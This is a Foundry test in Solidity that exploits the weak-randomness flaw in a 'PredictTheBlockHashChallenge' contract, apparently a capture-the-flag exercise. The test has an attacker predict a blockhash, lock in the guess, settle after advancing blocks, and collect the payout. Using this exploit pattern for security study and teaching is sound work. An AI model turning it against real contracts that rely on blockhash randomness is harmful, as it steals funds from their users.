
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {
    PredictTheBlockHashChallenge challenge;
    address attacker = address(this);

    function setUp() public {
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        vm.assume(blockNumber > 0 && blockNumber < type(uint256).max - 2);

        vm.deal(attacker, 10 ether);

        vm.roll(blockNumber);

        bytes32 predictedHash = blockhash(block.number + 1);

        vm.prank(attacker);
        challenge.lockInGuess{value: 1 ether}(predictedHash);

        vm.roll(block.number + 2);

        bytes32 expectedAnswer = blockhash(blockNumber + 1);

        vm.prank(attacker);
        challenge.settle();

        assertEq(expectedAnswer, predictedHash, "Locally predicted hash must match guess");
        assertEq(attacker.balance, 11 ether, "Attacker should receive 2 ether payout");
    }
}
